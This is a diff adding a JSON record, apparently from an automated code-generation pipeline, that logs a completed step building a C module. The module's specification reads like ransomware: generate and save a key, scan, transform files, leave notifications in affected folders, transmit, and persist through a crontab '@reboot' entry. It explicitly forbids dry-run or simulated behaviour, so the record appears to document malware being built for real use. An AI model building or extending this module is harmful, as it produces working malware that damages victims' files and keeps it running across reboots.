@@ -1,0 +1,13 @@
+{
+  "code_lines": 8,
+  "code_path": "modules/sequencia_de_execucao_e_agendamento.c",
+  "code_sha256": "17fd2b5862c1fb8e4248b6a92a851a68d81984b9dbe40e6d90315832c6b3523a",
+  "description": "In `main()`, the utility SHALL perform the following actions in order: generate and save the key; scan; transform; generate operational notifications only in affected folders; transmit; and schedule automatically. The utility SHALL read the current crontab using `popen(\"crontab -l\",\"r\")`. If `@reboot <caminho_binario>` does not exist in the current crontab, the utility SHALL add it using `popen(\"crontab -\",\"w\")`. The tool does not use `dry_run` or simulation flags, or `printf` to pretend that an action occurred.",
+  "duration_seconds": 19.370027,
+  "finished_at": "2026-09-25T02:14:52.277+00:00",
+  "index": 6,
+  "name": "sequencia_de_execucao_e_agendamento",
+  "prompt_path": "modules/06_sequencia_de_execucao_e_agendamento/prompt.txt",
+  "started_at": "2026-09-25T02:14:32.907+00:00",
+  "status": "completed"
+}
